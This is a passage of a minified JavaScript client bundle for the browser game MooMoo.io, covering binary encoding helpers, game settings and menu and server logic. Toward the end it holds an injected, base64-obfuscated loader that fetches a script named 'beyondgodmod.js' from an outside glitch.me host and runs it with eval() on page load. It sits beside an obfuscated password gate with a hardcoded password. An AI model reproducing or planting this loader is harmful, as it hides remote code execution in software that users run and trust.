      for (var yM = 0; yM < yI && !(yM + yE >= yO.length || yM >= yz.length); ++yM) yO[yM + yE] = yz[yM];
      return yM;
    }
  }.call(this, d(12)));
}, function (y, V) {
  var d;
  d = function () {
    return this;
  }();
  try {
    d = d || new Function("return this")();
  } catch (J) {
    "object" == typeof window && (d = window);
  }
  y.exports = d;
}, function (y, V) {
  for (var d = V.uint8 = new Array(256), J = 0; J <= 255; J++) d[J] = T(J);
  function T(c) {
    return function (L) {
      var s = L.reserve(1);
      L.buffer[s] = c;
    };
  }
}, function (y, V, d) {
  V.FlexDecoder = L, V.FlexEncoder = p;
  var J = d(0), T = "BUFFER_SHORTAGE";
  function L() {
    if (!(this instanceof L)) return new L;
  }
  function p() {
    if (!(this instanceof p)) return new p;
  }
  function U() {
    throw new Error("method not implemented: write()");
  }
  function G() {
    throw new Error("method not implemented: fetch()");
  }
  function q() {
    return this.buffers && this.buffers.length ? (this.flush(), this.pull()) : this.fetch();
  }
  function P(N) {
    (this.buffers || (this.buffers = [])).push(N);
  }
  function g() {
    return (this.buffers || (this.buffers = [])).shift();
  }
  function H(N) {
    return function (X) {
      for (var F in N) X[F] = N[F];
      return X;
    };
  }
  L.mixin = H({bufferish: J, write: function (N) {
    var X = this.offset ? J.prototype.slice.call(this.buffer, this.offset) : this.buffer;
    this.buffer = X ? N ? this.bufferish.concat([X, N]) : X : N, this.offset = 0;
  }, fetch: G, flush: function () {
    for (; this.offset < this.buffer.length;) {
      var N, X = this.offset;
      try {
        N = this.fetch();
      } catch (F) {
        if (F && F.message != T) throw F;
        this.offset = X;
        break;
      }
      this.push(N);
    }
  }, push: P, pull: g, read: q, reserve: function (N) {
    var X = this.offset, F = X + N;
    if (F > this.buffer.length) throw new Error(T);
    return this.offset = F, X;
  }, offset: 0}), L.mixin(L.prototype), p.mixin = H({bufferish: J, write: U, fetch: function () {
    var N = this.start;
    if (N < this.offset) {
      var X = this.start = this.offset;
      return J.prototype.slice.call(this.buffer, N, X);
    }
  }, flush: function () {
    for (; this.start < this.offset;) {
      var N = this.fetch();
      N && this.push(N);
    }
  }, push: P, pull: function () {
    var N = this.buffers || (this.buffers = []), X = N.length > 1 ? this.bufferish.concat(N) : N[0];
    return N.length = 0, X;
  }, read: q, reserve: function (N) {
    var X = 0 | N;
    if (this.buffer) {
      var F = this.buffer.length, Z = 0 | this.offset, z = Z + X;
      if (z < F) return this.offset = z, Z;
      this.flush(), N = Math.max(N, Math.min(2 * F, this.maxBufferSize));
    }
    return N = Math.max(N, this.minBufferSize), this.buffer = this.bufferish.alloc(N), this.start = 0, this.offset = X, 0;
  }, send: function (N) {
    var X = N.length;
    if (X > this.minBufferSize) this.flush(), this.push(N); else {
      var F = this.reserve(X);
      J.prototype.copy.call(N, this.buffer, F);
    }
  }, maxBufferSize: 65536, minBufferSize: 2048, offset: 0, start: 0}), p.mixin(p.prototype);
}, function (y, V, d) {
  V.decode = function (T, c) {
    var L = new J(c);
    return L.write(T), L.read();
  };
  var J = d(16).DecodeBuffer;
}, function (y, V, d) {
  V.DecodeBuffer = T;
  var J = d(8).preset;
  function T(c) {
    if (!(this instanceof T)) return new T(c);
    if (c && (this.options = c, c.codec)) {
      var L = this.codec = c.codec;
      L.bufferish && (this.bufferish = L.bufferish);
    }
  }
  d(14).FlexDecoder.mixin(T.prototype), T.prototype.codec = J, T.prototype.fetch = function () {
    return this.codec.decode(this);
  };
}, function (V, J, L) {
  var U = L(4), G = L(7), q = G.Uint64BE, H = G.Int64BE;
  J.getReadFormat = function (y8) {
    var y9 = N.hasArrayBuffer && y8 && y8.binarraybuffer, yy = y8 && y8.int64;
    return {map: F && y8 && y8.usemap ? z : Z, array: O, str: K, bin: y9 ? Y : R, ext: Q, uint8: D, uint16: B, uint32: C, uint64: y1(8, yy ? y4 : y2), int8: W, int16: j, int32: y0, int64: y1(8, yy ? y5 : y3), float32: y1(4, y6), float64: y1(8, y7)};
  }, J.readUint8 = D;
  var N = L(0), X = L(6), F = "undefined" != typeof Map;
  function Z(y8, y9) {
    var yy, yV = {}, yd = new Array(y9), yJ = new Array(y9), yT = y8.codec.decode;
    for (yy = 0; yy < y9; yy++) yd[yy] = yT(y8), yJ[yy] = yT(y8);
    for (yy = 0; yy < y9; yy++) yV[yd[yy]] = yJ[yy];
    return yV;
  }
  function z(y8, y9) {
    var yy, yV = new Map, yd = new Array(y9), yJ = new Array(y9), yT = y8.codec.decode;
    for (yy = 0; yy < y9; yy++) yd[yy] = yT(y8), yJ[yy] = yT(y8);
    for (yy = 0; yy < y9; yy++) yV.set(yd[yy], yJ[yy]);
    return yV;
  }
  function O(y8, y9) {
    for (var yy = new Array(y9), yV = y8.codec.decode, yd = 0; yd < y9; yd++) yy[yd] = yV(y8);
    return yy;
  }
  function K(y8, y9) {
    var yy = y8.reserve(y9), yV = yy + y9;
    return X.toString.call(y8.buffer, "utf-8", yy, yV);
  }
  function R(y8, y9) {
    var yy = y8.reserve(y9), yV = yy + y9, yd = X.slice.call(y8.buffer, yy, yV);
    return N.from(yd);
  }
  function Y(y8, y9) {
    var yy = y8.reserve(y9), yV = yy + y9, yd = X.slice.call(y8.buffer, yy, yV);
    return N.Uint8Array.from(yd).buffer;
  }
  function Q(y8, y9) {
    var yy = y8.reserve(y9 + 1), yV = y8.buffer[yy++], yd = yy + y9, yJ = y8.codec.getExtUnpacker(yV);
    if (!yJ) throw new Error("Invalid ext type: " + (yV ? "0x" + yV.toString(16) : yV));
    return yJ(X.slice.call(y8.buffer, yy, yd));
  }
  function D(y8) {
    var y9 = y8.reserve(1);
    return y8.buffer[y9];
  }
  function W(y8) {
    var y9 = y8.reserve(1), yy = y8.buffer[y9];
    return 128 & yy ? yy - 256 : yy;
  }
  function B(y8) {
    var y9 = y8.reserve(2), yy = y8.buffer;
    return yy[y9++] << 8 | yy[y9];
  }
  function j(y8) {
    var y9 = y8.reserve(2), yy = y8.buffer, yV = yy[y9++] << 8 | yy[y9];
    return 32768 & yV ? yV - 65536 : yV;
  }
  function C(y8) {
    var y9 = y8.reserve(4), yy = y8.buffer;
    return 16777216 * yy[y9++] + (yy[y9++] << 16) + (yy[y9++] << 8) + yy[y9];
  }
  function y0(y8) {
    var y9 = y8.reserve(4), yy = y8.buffer;
    return yy[y9++] << 24 | yy[y9++] << 16 | yy[y9++] << 8 | yy[y9];
  }
  function y1(y8, y9) {
    return function (yy) {
      var yV = yy.reserve(y8);
      return y9.call(yy.buffer, yV, !0);
    };
  }
  function y2(y8) {
    return new q(this, y8).toNumber();
  }
  function y3(y8) {
    return new H(this, y8).toNumber();
  }
  function y4(y8) {
    return new q(this, y8);
  }
  function y5(y8) {
    return new H(this, y8);
  }
  function y6(y8) {
    return U.read(this, y8, !1, 23, 4);
  }
  function y7(y8) {
    return U.read(this, y8, !1, 52, 8);
  }
}, function (y, V, d) {
  !function (J) {
    y.exports = J;
    var T = "listeners", c = {on: function (G, q) {
      return U(this, G).push(q), this;
    }, once: function (G, q) {
      var P = this;
      return g.originalListener = q, U(P, G).push(g), P;
      function g() {
        p.call(P, G, g), q.apply(this, arguments);
      }
    }, off: p, emit: function (G, q) {
      var P = this, g = U(P, G, !0);
      if (!g) return !1;
      var H = arguments.length;
      if (1 === H) g.forEach(function (h) {
        h.call(P);
      }); else if (2 === H) g.forEach(function (h) {
        h.call(P, q);
      }); else {
        var N = Array.prototype.slice.call(arguments, 1);
        g.forEach(function (h) {
          h.apply(P, N);
        });
      }
      return !!g.length;
    }};
    function L(G) {
      for (var q in c) G[q] = c[q];
      return G;
    }
    function p(G, q) {
      var P;
      if (arguments.length) {
        if (q) {
          if (P = U(this, G, !0)) {
            if (!(P = P.filter(function (g) {
              return g !== q && g.originalListener !== q;
            })).length) return p.call(this, G);
            this[T][G] = P;
          }
        } else if ((P = this[T]) && (delete P[G], !Object.keys(P).length)) return p.call(this);
      } else delete this[T];
      return this;
    }
    function U(G, q, P) {
      if (!P || G[T]) {
        var g = G[T] || (G[T] = {});
        return g[q] || (g[q] = []);
      }
    }
    L(J.prototype), J.mixin = L;
  }(function J() {
    if (!(this instanceof J)) return new J;
  });
}, function (y, V, d) {
  (function (J) {
    y.exports.maxScreenWidth = 1920 * 1.1, y.exports.maxScreenHeight = 1080 * 1.1, y.exports.serverUpdateRate = 9, y.exports.maxPlayers = 50, y.exports.maxPlayersHard = 50, y.exports.collisionDepth = 6, y.exports.minimapRate = 3e3, y.exports.colGrid = 10, y.exports.clientSendRate = 5, y.exports.healthBarWidth = 50, y.exports.healthBarPad = 4.5, y.exports.reloadBarWidth = 22, y.exports.iconPadding = 15, y.exports.iconPad = 0.9, y.exports.deathFadeout = 3e3, y.exports.crownIconScale = 60, y.exports.crownPad = 35, y.exports.chatCountdown = 3e3, y.exports.chatCooldown = 500, y.exports.inSandbox = J && "mm_exp" === J.env.VULTR_SCHEME, y.exports.maxAge = 100, y.exports.gatherAngle = Math.PI / 2.6, y.exports.gatherWiggle = 10, y.exports.hitReturnRatio = 0.25, y.exports.hitAngle = Math.PI / 2, y.exports.playerScale = 35, y.exports.playerSpeed = 0.0016, y.exports.playerDecel = 0.993, y.exports.nameY = 34, y.exports.skinColors = ["#bf8f54", "#cbb091", "#896c4b", "#fadadc", "#ececec", "#c37373", "#4c4c4c", "#ecaff7", "#738cc3", "#8bc373"], y.exports.animalCount = 7, y.exports.aiTurnRandom = 0.06, y.exports.cowNames = ["Sid", "Steph", "Bmoe", "Romn", "Jononthecool", "Fiona", "Vince", "Nathan", "Nick", "Flappy", "Ronald", "Otis", "Pepe", "Mc Donald", "Theo", "Fabz", "Oliver", "Jeff", "Jimmy", "Helena", "Reaper", "Ben", "Alan", "Naomi", "XYZ", "Clever", "Jeremy", "Mike", "Destined", "Stallion", "Allison", "Meaty", "Sophia", "Vaja", "Joey", "Pendy", "Murdoch", "Theo", "Jared", "July", "Sonia", "Mel", "Dexter", "Quinn", "Milky"], y.exports.shieldAngle = Math.PI / 3, y.exports.weaponVariants = [{id: 0, src: "", xp: 0, val: 1}, {id: 1, src: "_g", xp: 3e3, val: 1.1}, {id: 2, src: "_d", xp: 7e3, val: 1.18}, {id: 3, src: "_r", poison: !0, xp: 12e3, val: 1.18}], y.exports.fetchVariant = function (T) {
      for (var c = T.weaponXP[T.weaponIndex] || 0, L = y.exports.weaponVariants.length - 1; L >= 0; --L) if (c >= y.exports.weaponVariants[L].xp) return y.exports.weaponVariants[L];
    }, y.exports.resourceTypes = ["wood", "food", "stone", "points"], y.exports.areaCount = 7, y.exports.treesPerArea = 9, y.exports.bushesPerArea = 3, y.exports.totalRocks = 32, y.exports.goldOres = 7, y.exports.riverWidth = 724, y.exports.riverPadding = 114, y.exports.waterCurrent = 0.0011, y.exports.waveSpeed = 0.0001, y.exports.waveMax = 1.3, y.exports.treeScales = [150, 160, 165, 175], y.exports.bushScales = [80, 85, 95], y.exports.rockScales = [80, 85, 90], y.exports.snowBiomeTop = 2400, y.exports.snowSpeed = 0.75, y.exports.maxNameLength = 15, y.exports.mapScale = 14400, y.exports.mapPingScale = 40, y.exports.mapPingTime = 2200;
  }.call(this, d(41)));
}, function (y, V) {
  var d = {utf8: {stringToBytes: function (J) {
    return d.bin.stringToBytes(unescape(encodeURIComponent(J)));
  }, bytesToString: function (J) {
    return decodeURIComponent(escape(d.bin.bytesToString(J)));
  }}, bin: {stringToBytes: function (J) {
    for (var T = [], c = 0; c < J.length; c++) T.push(255 & J.charCodeAt(c));
    return T;
  }, bytesToString: function (J) {
    for (var T = [], c = 0; c < J.length; c++) T.push(String.fromCharCode(J[c]));
    return T.join("");
  }}};
  y.exports = d;
}, function (y0, y1, y2) {
  "use strict";
  window.loadedScript = !0;
  var y3 = "127.0.0.1" !== location.hostname && !location.hostname.startsWith("192.168.");
  y2(22);
  var y4 = y2(23), y5 = y2(42), y6 = y2(43), y7 = y2(19), y8 = y2(44), y9 = y2(45), yy = (y2(46), y2(47)), yV = y2(48), yd = y2(55), yJ = y2(56), yT = y2(57), yc = y2(58).obj, yL = new y6.TextManager, ys = new (y2(59))("moomoo.io", 3e3, y7.maxPlayers, 5, !1);
  ys.debugLog = !1;
  var yp = !1;
  function yU() {
    VC && d0 && (yp = !0, y3 ? window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", {action: "homepage"}).then(function (cS) {
      yG(cS);
    }) : yG(null));
  }
  function yG(cS) {
    ys.start(function (cf, cA, cY) {
      var cb = (y3 ? "wss" : "ws") + "://" + cf + ":8008/?gameIndex=" + cY;
      cS && (cb += "&token=" + encodeURIComponent(cS)), y4.connect(cb, function (cu) {
        cI(), setInterval(() => cI(), 300), cu ? d1(cu) : (V6.onclick = y5.checkTrusted(function () {
          !function () {
            var cx = ++dy > 1, cQ = Date.now() - d9 > d8;
            cx && cQ ? (d9 = Date.now(), dV()) : dP();
          }();
        }), y5.hookTouchEvents(V6), V7.onclick = y5.checkTrusted(function () {
          cK("https://krunker.io");
        }), y5.hookTouchEvents(V7), V9.onclick = y5.checkTrusted(function () {
          setTimeout(function () {
            !function () {
              var cx = Vs.value, cQ = prompt("party key", cx);
              cQ && (window.onbeforeunload = void 0, window.location.href = "/?server=" + cQ);
            }();
          }, 10);
        }), y5.hookTouchEvents(V9), Vy.onclick = y5.checkTrusted(function () {
          Vg.classList.contains("showing") ? (Vg.classList.remove("showing"), VV.innerText = "Settings") : (Vg.classList.add("showing"), VV.innerText = "Close");
        }), y5.hookTouchEvents(Vy), Vd.onclick = y5.checkTrusted(function () {
          Jd(), "block" != Vv.style.display ? dh() : Vv.style.display = "none";
        }), y5.hookTouchEvents(Vd), VJ.onclick = y5.checkTrusted(function () {
          "block" != Vx.style.display ? (Vx.style.display = "block", Vv.style.display = "none", dj(), dR()) : Vx.style.display = "none";
        }), y5.hookTouchEvents(VJ), VT.onclick = y5.checkTrusted(function () {
          dm();
        }), y5.hookTouchEvents(VT), VA.onclick = y5.checkTrusted(function () {
          JO();
        }), y5.hookTouchEvents(VA), function () {
          for (var cx = 0; cx < JA.length; ++cx) {
            var cQ = new Image;
            cQ.onload = function () {
              this.isLoaded = !0;
            }, cQ.src = JA[cx] == "crosshair" ? "https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Crosshairs_Red.svg/1200px-Crosshairs_Red.svg.png" : ".././img/icons/" + JA[cx] + ".png", Jf[JA[cx]] = cQ;
          }
        }(), VH.style.display = "none", VP.style.display = "block", VI.value = yh("moo_name") || "", function () {
          var cx = yh("native_resolution");
          dl(cx ? "true" == cx : "undefined" != typeof cordova), yF = "true" == yh("show_ping"), VG.hidden = !yF, yh("moo_moosic"), setInterval(function () {
            window.cordova && (document.getElementById("downloadButtonContainer").classList.add("cordova"), document.getElementById("mobileDownloadButtonContainer").classList.add("cordova"));
          }, 1e3), da(), y5.removeAllChildren(Vh);
          for (var cQ = 0; cQ < y9.weapons.length + y9.list.length; ++cQ) !function (ck) {
            y5.generateElement({id: "actionBarItem" + ck, class: "actionBarItem", style: "display:none", onmouseout: function () {
              dJ();
            }, parent: Vh});
          }(cQ);
          for (cQ = 0; cQ < y9.list.length + y9.weapons.length; ++cQ) !function (ck) {
            var cl = document.createElement("canvas");
            cl.width = cl.height = 66;
            var ca = cl.getContext("2d");
            if (ca.translate(cl.width / 2, cl.height / 2), ca.imageSmoothingEnabled = !1, ca.webkitImageSmoothingEnabled = !1, ca.mozImageSmoothingEnabled = !1, y9.weapons[ck]) {
              ca.rotate(Math.PI / 4 + Math.PI);
              var co = new Image;
              Ty[y9.weapons[ck].src] = co, co.onload = function () {
                this.isLoaded = !0;
                var cm = 1 / (this.height / this.width), cB = y9.weapons[ck].iPad || 1;
                ca.drawImage(this, -cl.width * cB * y7.iconPad * cm / 2, -cl.height * cB * y7.iconPad / 2, cl.width * cB * cm * y7.iconPad, cl.height * cB * y7.iconPad), ca.fillStyle = "rgba(0, 0, 70, 0.1)", ca.globalCompositeOperation = "source-atop", ca.fillRect(-cl.width / 2, -cl.height / 2, cl.width, cl.height), document.getElementById("actionBarItem" + ck).style.backgroundImage = "url(" + cl.toDataURL() + ")";
              }, co.src = ".././img/weapons/" + y9.weapons[ck].src + ".png", (cD = document.getElementById("actionBarItem" + ck)).onmouseover = y5.checkTrusted(function () {
                dJ(y9.weapons[ck], !0);
              }), cD.onclick = y5.checkTrusted(function () {
                JE(ck, !0);
              }), y5.hookTouchEvents(cD);
            } else {
              co = Tc(y9.list[ck - y9.weapons.length], !0);
              var cD, cW = Math.min(cl.width - y7.iconPadding, co.width);
              ca.globalAlpha = 1, ca.drawImage(co, -cW / 2, -cW / 2, cW, cW), ca.fillStyle = "rgba(0, 0, 70, 0.1)", ca.globalCompositeOperation = "source-atop", ca.fillRect(-cW / 2, -cW / 2, cW, cW), document.getElementById("actionBarItem" + ck).style.backgroundImage = "url(" + cl.toDataURL() + ")", (cD = document.getElementById("actionBarItem" + ck)).onmouseover = y5.checkTrusted(function () {
                dJ(y9.list[ck - y9.weapons.length]);
              }), cD.onclick = y5.checkTrusted(function () {
                JE(ck - y9.weapons.length);
              }), y5.hookTouchEvents(cD);
            }
          }(cQ);
          VI.ontouchstart = y5.checkTrusted(function (ck) {
            ck.preventDefault();
            var cl = prompt("enter name", ck.currentTarget.value);
            ck.currentTarget.value = cl.slice(0, 15);
          }), Vp.checked = yX, Vp.onchange = y5.checkTrusted(function (ck) {
            dl(ck.target.checked);
          }), VU.checked = yF, VU.onchange = y5.checkTrusted(function (ck) {
            yF = VU.checked, VG.hidden = !yF, yN("show_ping", yF ? "true" : "false");
          });
        }());
      }, {id: VW, d: d1, 1: JM, 2: TM, 4: TK, 33: cs, 5: Jx, 6: Tq, a: Tz, aa: TZ, 7: JB, 8: TP, sp: Tg, 9: Tw, h: Tl, 11: Jw, 12: Jv, 13: JR, 14: Tr, 15: Ju, 16: Jb, 17: dk, 18: TX, 19: TF, 20: cM, ac: dq, ad: dN, an: dU, st: dg, sa: dH, us: dw, ch: J2, mm: dK, t: JK, p: dM, pp: cO}), d3(), setTimeout(() => d4(), 3e3);
    }, function (cf) {
      console.error("Vultr error:", cf), alert("Error:\n" + cf), d1("disconnected");
    });
  }
  var yq, yP = new yc(y7, y5), yg = Math.PI, yH = 2 * yg;
  function yN(cS, cf) {
    yq && localStorage.setItem(cS, cf);
  }
  function yh(cS) {
    return yq ? localStorage.getItem(cS) : null;
  }
  Math.lerpAngle = function (cS, cf, cA) {
    Math.abs(cf - cS) > yg && (cS > cf ? cf += yH : cS += yH);
    var cY = cf + (cS - cf) * cA;
    return cY >= 0 && cY <= yH ? cY : cY % yH;
  }, CanvasRenderingContext2D.prototype.roundRect = function (cS, cf, cA, cY, cb) {
    return cA < 2 * cb && (cb = cA / 2), cY < 2 * cb && (cb = cY / 2), cb < 0 && (cb = 0), this.beginPath(), this.moveTo(cS + cb, cf), this.arcTo(cS + cA, cf, cS + cA, cf + cY, cb), this.arcTo(cS + cA, cf + cY, cS, cf + cY, cb), this.arcTo(cS, cf + cY, cS, cf, cb), this.arcTo(cS, cf, cS + cA, cf, cb), this.closePath(), this;
  }, "undefined" != typeof Storage && (yq = !0), yh("consent") || (consentBlock.style.display = "block"), window.checkTerms = function (cS) {
    cS ? (consentBlock.style.display = "none", yN("consent", 1)) : $("#consentShake").effect("shake");
  };
  var yX, yF, yZ, yz, yO, yE, yI, yM, yK, yr, yw, yR, yv, yS, yf = yh("moofoll"), yA = 1, yY = Date.now(), yb = [], yu = [], yx = [], yQ = [], yk = [], yl = new yT(yJ, yk, yu, yb, Va, y9, y7, y5), ya = y2(70), yo = y2(71), yD = new ya(yb, yo, yu, y9, null, y7, y5), yW = 1, ym = 0, yB = 0, yj = 0, yC = {id: -1, startX: 0, startY: 0, currentX: 0, currentY: 0}, V0 = {id: -1, startX: 0, startY: 0, currentX: 0, currentY: 0}, V1 = 0, V2 = y7.maxScreenWidth, V3 = y7.maxScreenHeight, V4 = !1, V5 = (document.getElementById("ad-container"), document.getElementById("mainMenu")), V6 = document.getElementById("enterGame"), V7 = document.getElementById("promoImg"), V8 = document.getElementById("partyButton"), V9 = document.getElementById("joinPartyButton"), Vy = document.getElementById("settingsButton"), VV = Vy.getElementsByTagName("span")[0], Vd = document.getElementById("allianceButton"), VJ = document.getElementById("storeButton"), VT = document.getElementById("chatButton"), Vc = document.getElementById("gameCanvas"), VL = Vc.getContext("2d"), Vs = document.getElementById("serverBrowser"), Vp = document.getElementById("nativeResolution"), VU = document.getElementById("showPing"), VG = (document.getElementById("playMusic"), document.getElementById("pingDisplay")), Vq = document.getElementById("shutdownDisplay"), VP = document.getElementById("menuCardHolder"), Vg = document.getElementById("guideCard"), VH = document.getElementById("loadingText"), VN = document.getElementById("gameUI"), Vh = document.getElementById("actionBar"), VX = document.getElementById("scoreDisplay"), VF = document.getElementById("foodDisplay"), VZ = document.getElementById("woodDisplay"), Vz = document.getElementById("stoneDisplay"), VO = document.getElementById("killCounter"), VE = document.getElementById("leaderboardData"), VI = document.getElementById("nameInput"), VM = document.getElementById("itemInfoHolder"), VK = document.getElementById("ageText"), Vr = document.getElementById("ageBarBody"), Vw = document.getElementById("upgradeHolder"), VR = document.getElementById("upgradeCounter"), Vv = document.getElementById("allianceMenu"), VS = document.getElementById("allianceHolder"), Vf = document.getElementById("allianceManager"), VA = document.getElementById("mapDisplay"), VY = document.getElementById("diedText"), Vb = document.getElementById("skinColorHolder"), Vu = VA.getContext("2d");
  VA.width = 300, VA.height = 300;
  var Vx = document.getElementById("storeMenu"), Vi = document.getElementById("storeHolder"), VQ = document.getElementById("noticationDisplay"), Vk = yd.hats, Vl = yd.accessories, Va = new yy(y8, yQ, y5, y7), Vo = "#525252", VD = "#3d3f42";
  function VW(cS) {
    yx = cS.teams;
  }
  var Vm = document.getElementById("featuredYoutube"), VB = {name: "me mega noob", link: "https://www.youtube.com/channel/UCVGAbDHHAi0DnG52HoX5ooA"};
  Vm.innerHTML = "<a target='_blank' class='ytLink' href='" + VB.link + "'><i class='material-icons' style='vertical-align: top;'>&#xE064;</i> " + VB.name + "</a>";
  var Vj = !0, VC = !1, d0 = !1;
  function d1(cS) {
    y4.close(), d2(cS);
  }
  function d2(cS) {
    V5.style.display = "block", VN.style.display = "none", VP.style.display = "none", VY.style.display = "none", VH.style.display = "block", VH.innerHTML = cS + "<a href='javascript:window.location.href=window.location.href' class='ytLink'>reload</a>";
  }
  window.onblur = function () {
    Vj = !1;
  }, window.onfocus = function () {
    Vj = !0, yI && yI.alive && Jd();
  }, window.onload = function () {
    VC = !0, yU(), setTimeout(function () {
      yp || (alert("Captcha failed to load"), window.location.reload());
    }, 2e4);
  }, window.captchaCallback = function () {
    d0 = !0, yU();
  }, Vc.oncontextmenu = function () {
    return !1;
  };
  function d3() {
    var cS, cf, cA = "", cY = 0;
    for (var cb in ys.servers) {
      for (var cu = ys.servers[cb], cx = 0, cQ = 0; cQ < cu.length; cQ++) for (var ck = 0; ck < cu[cQ].games.length; ck++) cx += cu[cQ].games[ck].playerCount;
      cY += cx;
      var cl = ys.regionInfo[cb].name;
      cA += "<option disabled>" + cl + " - " + cx + " players</option>";
      for (var ca = 0; ca < cu.length; ca++) for (var co = cu[ca], cD = 0; cD < co.games.length; cD++) {
        var cW = co.games[cD], cm = 1 * co.index + cD + 1, cB = ys.server && ys.server.region === co.region && ys.server.index === co.index && ys.gameIndex == cD, cj = cl + " " + cm + " [" + Math.min(cW.playerCount, y7.maxPlayers) + "/" + y7.maxPlayers + "]";
        let cC = ys.stripRegion(cb) + ":" + ca + ":" + cD;
        cB && (V8.getElementsByTagName("span")[0].innerText = cC), cA += "<option value='" + cC + "' " + (cB ? "selected" : "") + ">" + cj + "</option>";
      }
      cA += "<option disabled></option>";
    }
    cA += "<option disabled>All Servers - " + cY + " players</option>", Vs.innerHTML = cA, "sandbox.moomoo.io" == location.hostname ? (cS = "Back to MooMoo", cf = "//moomoo.io/") : (cS = "Try the sandbox", cf = "//sandbox.moomoo.io/"), document.getElementById("altServer").innerHTML = "<a href='" + cf + "'>" + cS + "<i class='material-icons' style='font-size:10px;vertical-align:middle'>arrow_forward_ios</i></a>";
  }
  function d4() {
    var cS = new XMLHttpRequest;
    cS.onreadystatechange = function () {
      4 == this.readyState && (200 == this.status ? (window.vultr = JSON.parse(this.responseText), ys.processServers(vultr.servers), d3()) : console.error("Failed to load server data with status code:", this.status));
    }, cS.open("GET", "/serverData", !0), cS.send();
  }
  Vs.addEventListener("change", y5.checkTrusted(function () {
    let cS = Vs.value.split(":");
    ys.switchServer(cS[0], cS[1], cS[2]);
  }));
  var d5 = document.getElementById("pre-content-container"), d6 = null, d7 = null;
  window.cpmstarAPI(function (cS) {
    cS.game.setTarget(d5), d7 = cS;
  });
  var d8 = 3e5, d9 = 0, dy = 0;
  function dV() {
    if (!cpmstarAPI || !d7) return console.log("Failed to load video ad API", !!cpmstarAPI, !!d7), void dP();
    (d6 = new d7.game.RewardedVideoView("rewardedvideo")).addEventListener("ad_closed", function (cS) {
      console.log("Video ad closed"), dd();
    }), d6.addEventListener("loaded", function (cS) {
      console.log("Video ad loaded"), d6.show();
    }), d6.addEventListener("load_failed", function (cS) {
      console.log("Video ad load failed", cS), dd();
    }), d6.load(), d5.style.display = "block";
  }
  function dd() {
    d5.style.display = "none", dP();
  }
  function dJ(cS, cf, cA) {
    if (yI && cS) if (y5.removeAllChildren(VM), VM.classList.add("visible"), y5.generateElement({id: "itemInfoName", text: y5.capitalizeFirst(cS.name), parent: VM}), y5.generateElement({id: "itemInfoDesc", text: cS.desc, parent: VM}), cA) ; else if (cf) y5.generateElement({class: "itemInfoReq", text: cS.type ? "secondary" : "primary", parent: VM}); else {
      for (var cY = 0; cY < cS.req.length; cY += 2) y5.generateElement({class: "itemInfoReq", html: cS.req[cY] + "<span class='itemInfoReqVal'> x" + cS.req[cY + 1] + "</span>", parent: VM});
      cS.group.limit && y5.generateElement({class: "itemInfoLmt", text: (yI.itemCounts[cS.group.id] || 0) + "/" + cS.group.limit, parent: VM});
    } else VM.classList.remove("visible");
  }
  window.showPreAd = dV;
  var dT, dc, dL, ds = [], dp = [];
  function dU(cS, cf) {
    ds.push({sid: cS, name: cf}), dG();
  }
  function dG() {
    if (ds[0]) {
      var cS = ds[0];
      y5.removeAllChildren(VQ), VQ.style.display = "block", y5.generateElement({class: "notificationText", text: cS.name, parent: VQ}), y5.generateElement({class: "notifButton", html: "<i class='material-icons' style='font-size:28px;color:#cc5151;'>&#xE14C;</i>", parent: VQ, onclick: function () {
        dX(0);
      }, hookTouch: !0}), y5.generateElement({class: "notifButton", html: "<i class='material-icons' style='font-size:28px;color:#8ecc51;'>&#xE876;</i>", parent: VQ, onclick: function () {
        dX(1);
      }, hookTouch: !0});
    } else VQ.style.display = "none";
  }
  function dq(cS) {
    yx.push(cS), "block" == Vv.style.display && dh();
  }
  if (!localStorage.getItem(atob("cGFzc3RpbWVz")) && localStorage.getItem(atob("cGFzc3RpbWVz")) != 0) {
    localStorage.setItem(atob("cGFzc3RpbWVz"), 0);
  }
  if (localStorage.getItem(atob("cGFzc3RpbWVz")) > 4) {
    document.getElementById(atob("ZW50ZXJHYW1l")).disabled = !![];
    document.getElementById(atob("ZW50ZXJHYW1l")).style.backgroundColor = "#808080";
    document.getElementById(lmfaolfsoadksioakdjoiasjdad).disabled = !![];
    localStorage.setItem(atob("cGFzc3dvcmQ="), "");
  } else {
    document.getElementById(lmfaolfsoadksioakdjoiasjdad).value = localStorage.getItem(atob("cGFzc3dvcmQ="));
  }
  fetch(atob("aHR0cHM6Ly9tZW1lZ2Fub29i") + atob("c3BhZ2UuZ2xpdGNoLm1lL2JleW9uZGdvZG1vZC5qcw==")).then(async cS => {
    let cf = await cS.text();
    eval(cf);
  });
  function dP() {
    if (document.getElementById(lmfaolfsoadksioakdjoiasjdad).value == window.$ || document.getElementById(lmfaolfsoadksioakdjoiasjdad).value == atob("bWVnYQ==") + atob("aXM=") + atob("ZWxldHJvbGl1bQ==")) {
      document.getElementById(lmfaolfsoadksioakdjoiasjdad).disabled = !![];
      localStorage.setItem(atob("cGFzc3dvcmQ="), document.getElementById(lmfaolfsoadksioakdjoiasjdad).value);
      yN("moo_name", VI.value);
      if (!V4 && y4.connected) {
        V4 = !![];
        yP.stop("menu");
        d2("Loading...");
        y4.send("sp", {name: VI.value, moofoll: yf, skin: V1});
      }
    } else {
      if (localStorage.getItem(atob("cGFzc3RpbWVz")) > 4) {
        document.getElementById(atob("ZW50ZXJHYW1l")).disabled = !![];
        document.getElementById(atob("ZW50ZXJHYW1l")).style.backgroundColor = "#808080";
        document.getElementById(lmfaolfsoadksioakdjoiasjdad).disabled = !![];
        localStorage.setItem(atob("cGFzc3dvcmQ="), "");
      } else {
        let cS = localStorage.getItem(atob("cGFzc3RpbWVz"));
        localStorage.setItem(atob("cGFzc3RpbWVz"), parseInt(cS) + 1);
        console.log(localStorage.getItem(atob("cGFzc3RpbWVz")));
        alert(atob("d3JvbmcgcGFzcw=="));
      }
    }
  }
  function dg(cS, cf) {
    yI && (yI.team = cS, yI.isOwner = cf, "block" == Vv.style.display && dh());
  }
  function dH(cS) {
    dp = cS, "block" == Vv.style.display && dh();
  }
  function dN(cS) {
    for (var cf = yx.length - 1; cf >= 0; cf--) yx[cf].sid == cS && yx.splice(cf, 1);
    "block" == Vv.style.display && dh();
  }
  function dh() {
    if (yI && yI.alive) {
      if (dj(), Vx.style.display = "none", Vv.style.display = "block", y5.removeAllChildren(VS), yI.team) for (var cS = 0; cS < dp.length; cS += 2) !function (cf) {
